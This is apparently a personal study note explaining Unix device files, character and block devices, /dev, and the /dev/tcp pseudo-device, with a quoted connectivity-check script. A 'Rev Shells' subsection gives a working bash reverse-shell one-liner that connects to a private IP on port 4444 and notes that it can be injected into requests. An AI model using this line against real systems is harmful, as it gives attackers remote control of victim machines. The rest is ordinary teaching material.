
# Unix Device Files
A device file in Unix is a file which is an *interface to a device driver*. It appears in the filesystem the same as other regular files but is special in that it *allows an application to interact with a device*. These files can also be referred to as 'device nodes'. Other [operating systems](computers/concepts/operating-system.md) employ similar interfaces, but this will focus on Unix specifically.
## Unix Device Nodes
In Unix, device nodes/files correspond to resources allocated by the [kernel](computers/concepts/kernel.md). In Unix, the resources are identified using two different numbers a *minor number*, and a *major number*. In general, the major number is meant to identify  the device driver and the minor number is meant to identify the device the driver controls.

The computer treats these nodes like standard system files and *interacts with them using system calls*. There are two different types of device files: Character devices, and Block devices. Unfortunately, the names for both are misleading due to some historical reason.
### Character Device Files
To avoid confusion, these devices are also called *'Raw Devices'*. They provide *direct access* to the hardware device. Contrary to the name, character devices *do not necessarily allow programs to read or write to these devices one character at a time*. Instead, it is dependent on the device to decide how it can be read or written to.

In general, character devices are supposed to be devices which *access data in character units.* Some examples of character devices include keyboards, modems, sound cards, etc..
### Block Device Files
Block devices are different from character ones because they allow *reading and writing a block of any size to the device*. This means that a single character can be read or written to a block device. In general, block devices read and write data in *chunks or blocks*. Some examples include CDROM drives, flash drives, and hard drives.

Because block devices *are buffered* a programmer doesn't know how long it will take for the data being written to pass from the kernel's buffer to the actual device. They also can't be sure in what order two separate writes will reach the device.
## `/dev`
The `/dev` directory contains entries for *physical devices* which may or may not represent actual hardware present on the system (device files). Among the devices represented here, you can find the loopback directory (for [loopback](../../../networking/routing/loopback.md) devices) `/dev/loop0`, CD drives (`/dev/hdc`), hard drive partitions (`/dev/sda1`), [UDP](../../../networking/protocols/UDP.md) ports `/dev/udp`,  TCP ports `/dev/tcp`, etc. as well as specialized pseudo-devices like `/dev/null`, `/dev/zero`, and `/dev/urandom`.  

Some devices mounted here are *virtual* like `/dev/null`,  `/dev/zero`,  and `/dev/urandom`. This means they're not actual physical devices and *only exist in software*. 
### `/dev/tcp`
`/dev/tcp/[host]/[port]` is a *psuedo device file* and writing to it will *open a [TCP](../../../networking/protocols/TCP.md) connection* to the referenced host and port number. The `/[host]` and `/[port]` "directories" correspond to the *destination*, not the address and port number of the local machine making the connection.
#### Rev Shells
An example of how `/dev/tcp` can be used in scripts is this one-liner [bash](../../../coding/languages/bash.md) script which can be injected into a request to open a [rev-shell](../../../cybersecurity/TTPs/exploitation/rev-shell.md):
```bash
 bash -i >& /dev/tcp/192.168.119.3/4444 0>&1
```
#### Troubleshooting
Here is another example script for using `/dev/tcp` to troubleshoot an internet connection by sending an HTTP request through port 80 to the destination host.
```bash 
#!/bin/bash
# dev-tcp.sh: /dev/tcp redirection to check Internet connection.

# Script by Troy Engel.
# Used with permission.
 
TCP_HOST=news-15.net       # A known spam-friendly ISP.
TCP_PORT=80                # Port 80 is http.
  
# Try to connect. (Somewhat similar to a 'ping' . . .) 
echo "HEAD / HTTP/1.0" >/dev/tcp/${TCP_HOST}/${TCP_PORT}
MYEXIT=$?

: <<EXPLANATION
If bash was compiled with --enable-net-redirections, it has the capability of
using a special character device for both TCP and UDP redirections. These
redirections are used identically as STDIN/STDOUT/STDERR. The device entries
are 30,36 for /dev/tcp:

  mknod /dev/tcp c 30 36

>From the bash reference:
/dev/tcp/host/port
    If host is a valid hostname or Internet address, and port is an integer
port number or service name, Bash attempts to open a TCP connection to the
corresponding socket.
EXPLANATION

   
if [ "X$MYEXIT" = "X0" ]; then
  echo "Connection successful. Exit code: $MYEXIT"
else
  echo "Connection unsuccessful. Exit code: $MYEXIT"
fi

exit $MYEXIT
```
> [Advanced Bash Scripting Guide: 29.1. /dev](https://tldp.org/LDP/abs/html/devref1.html)

> [!Resources]
> - [Wikipedia: Device File](https://en.wikipedia.org/wiki/Device_file)
> - [Advanced Bash Scripting Guide: 29.1. /dev](https://tldp.org/LDP/abs/html/devref1.html)